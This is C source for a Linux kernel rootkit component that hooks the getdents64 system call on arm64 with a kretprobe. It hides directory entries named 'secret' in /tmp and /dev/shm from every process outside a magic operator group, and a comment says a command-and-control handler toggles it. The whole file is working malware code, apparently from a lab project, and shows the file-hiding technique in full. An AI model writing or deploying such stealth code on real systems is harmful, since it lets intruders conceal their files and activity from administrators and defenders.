/*
 * file_hide.c: hide secret directories from directory listings
 *
 * When a process lists /tmp or /dev/shm, remove the entry named "secret"
 * so it does not appear. Use d_path() to identify which directory is being
 * listed: do NOT use d_iname(), it returns the device name for mount
 * points, not the path you expect.
 *
 * Operator bypass: processes with MAGIC_GID see everything. Walk
 * cred->group_info directly: do NOT use in_group_p() (returns true for
 * root).
 *
 * Reference: cloak.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/cred.h>
#include <asm/ptrace.h>

#include "rootkit.h"

#define MAX_BUF_SIZE (1 << 16)

/* ─── Per-instance data passed from entry to return handler ───────────────── */

struct file_hide_data {
	struct linux_dirent64 __user *dirp;
  unsigned int fd;
};

/* ─── Entry handler ───────────────────────────────────────────────────────── */

static int file_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct pt_regs *inner_regs = (struct pt_regs *)regs->regs[0];
	struct file_hide_data *data = (struct file_hide_data *)ri->data;

	/* dirp is the second syscall arg -> regs[1] of the inner pt_regs */
  /* and fd is the first arg -> regs[0] of the inner pt_regs*/
	data->dirp = (struct linux_dirent64 __user *)inner_regs->regs[1];
  data->fd = (unsigned int)inner_regs->regs[0];

	return 0;
}

/* ─── Return handler ──────────────────────────────────────────────────────── */

static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct file_hide_data *data = (struct file_hide_data *)ri->data;
	struct linux_dirent64 __user *dirp = data->dirp;
  unsigned int fd = data->fd;
  struct file *file;
	struct linux_dirent64 *current_dir, *prev = NULL;
	int total_bytes = regs_return_value(regs);
	char buf[MAX_PATH_LEN];
  char *kbuf, *path_str;
	int offset = 0;

  /* converting fd to a struct file * */
  file = fget(fd);
  if (!file)
    return 0;

  /* getting absolute filename from d_path() */
  path_str = d_path(&file->f_path, buf, sizeof(buf));
  if (IS_ERR(path_str)) {
    fput(file);
    return 0;
  }

	/* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0) {
		fput(file);
    return 0;
  }

	/* Privileged user sees everything */
	if (caller_has_magic_gid()) {
		fput(file);
    return 0;
  }

  /* Non hidden files do not get filtered*/
  if (strncmp(path_str, "/dev/shm", 9) != 0 && strncmp(path_str, "/tmp", 5) != 0) {
    fput(file);
    return 0;
  }

  fput(file);

	/* Atomic because kretprobe handlers run in atomic context */
	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

	/* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (strncmp(current_dir->d_name, HIDDEN_FILENAME, HIDDEN_FILENAME_LEN) != 0) {
			/* No match — advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}

	/* Write filtered buffer back to userspace and fix return value */
	if (copy_to_user(dirp, kbuf, total_bytes)) {
	kfree(kbuf);
	return 0;
	}

	regs->regs[0] = total_bytes;

	kfree(kbuf);
	return 0;
}

/* ─── Kretprobe definition ────────────────────────────────────────────────── */

static struct kretprobe file_hide_krp = {
	.handler       = file_hide_return,
	.entry_handler = file_hide_entry,
	.data_size     = sizeof(struct file_hide_data),
	.maxactive     = 20,
	.kp.symbol_name = "__arm64_sys_getdents64",
};

/* ─── State tracking ──────────────────────────────────────────────────────── */

static bool active;

/* ─── Public interface ────────────────────────────────────────────────────── */

int file_hide_init(void)
{
  int ret = register_kretprobe(&file_hide_krp);
  if (ret < 0){
    pr_err("[file_hide][ERROR] failed to register kretprobe: %d\n", ret);
    return ret;
  }

  active = true;
  pr_info("[file_hide] kretprobe registered\n");
	return 0;
}

void file_hide_exit(void)
{
  if (!file_hide_is_active()) {
    pr_err("[file_hide][ERROR] Could not unregister kretprobe (no kretprobe active)\n");
    return;
  }
  
  unregister_kretprobe(&file_hide_krp);
  pr_info("[file_hide] kretprobe unregistered");
  pr_info("[file_hide] nmissed counter:%d\n", file_hide_krp.nmissed);
  active = false;
}

//called by the C2 handler for toggle commands.
int file_hide_enable(void)
{
	return file_hide_init();
}

void file_hide_disable(void)
{
  file_hide_exit();
}

bool file_hide_is_active(void)
{
	return active;
}
